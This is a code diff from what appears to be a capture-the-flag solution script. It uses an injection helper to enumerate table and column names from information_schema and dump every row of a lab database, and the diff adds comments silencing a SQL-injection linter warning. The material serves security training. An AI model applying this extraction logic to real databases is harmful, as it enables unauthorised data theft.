@@ -104,7 +104,7 @@ def q_table_names(cache):
     names = cache["tables"]
     guard = "zzz"
     while True:
-        expr = (f"(SELECT MAX(table_name) FROM information_schema.tables "
+        expr = (f"(SELECT MAX(table_name) FROM information_schema.tables "  # noqa: S608 — CTF extraction against the lab DB
                 f"WHERE table_schema='level5' AND table_name<'{guard}')")
         name = extract(expr, 60, f"tbl_{len(names)}", cache)
         if not name:
@@ -122,7 +122,7 @@ def q_columns(table, cache):
     cols = cache[f"cols_{table}"]
     guard = "zzz"
     while True:
-        expr = (f"(SELECT MAX(column_name) FROM information_schema.columns "
+        expr = (f"(SELECT MAX(column_name) FROM information_schema.columns "  # noqa: S608 — CTF extraction against the lab DB
                 f"WHERE table_schema='level5' AND table_name='{table}' "
                 f"AND column_name<'{guard}')")
         col = extract(expr, 80, f"col_{table}_{len(cols)}", cache)
@@ -138,7 +138,7 @@ def q_columns(table, cache):
 
 def q_cell(table, col, idx, cache):
     label = f"cell_{table}.{col}.{idx}"
-    expr = f"(SELECT {col} FROM {table} LIMIT {idx},1)"
+    expr = f"(SELECT {col} FROM {table} LIMIT {idx},1)"  # noqa: S608 — CTF extraction against the lab DB
     return extract(expr, 300, label, cache)
 
 
@@ -147,7 +147,7 @@ def main():
     tables = q_table_names(cache)
     for t in tables:
         cols = q_columns(t, cache)
-        n = num(f"(SELECT count(*) FROM {t})", 100, f"rows_{t}")
+        n = num(f"(SELECT count(*) FROM {t})", 100, f"rows_{t}")  # noqa: S608 — CTF extraction against the lab DB
         for i in range(n):
             for c in cols:
                 q_cell(t, c, i, cache)
